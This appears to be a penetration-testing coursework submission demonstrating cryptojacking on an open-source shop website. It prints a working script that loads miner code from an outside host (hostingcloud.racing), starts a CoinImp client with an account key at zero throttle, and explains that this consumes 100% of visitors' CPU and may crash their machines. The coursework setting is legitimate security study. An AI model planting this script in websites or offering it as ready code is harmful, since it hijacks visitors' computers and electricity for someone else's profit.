pentesting coursework 2 submission

---------------------------------------------------------------
As part of course work 2 of penetration testing we are submitting demo on Cryptojacking.

**Environment Used**
OS: Ubuntu 18:04
WebServer: Apache
website: Shopmaster (OpenSource)

Here, We have added js script which uses visitors CPU and mines crypto tokens. 
here is the main script which works behind the website to mine crypto.
---------------------------------------
<script src="https://www.hostingcloud.racing/j6Aw.js"></script>

<script>
    var _client = new Client.Anonymous('beb615ba485d42f5758ad24c30b4be705e20688a22179d31ac9f08e1cd66fef8', {
        throttle: 0, c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");

</script>
---------------------------------------
To make JS fully functional and get crypto mined we have created an account "https://www.coinimp.com/" where we can see how many hashes are mined from our website.
here we have used couple of parameters to notify and start the js script. we have an option to enable throttle which allows admin to limit usage of website users' CPU. for example if we set value to "0.4" in that case our website will use 60% CPU to mine the crypto. currently it is set to 0 so it will use 100% CPU and users System or PC may crash after while.
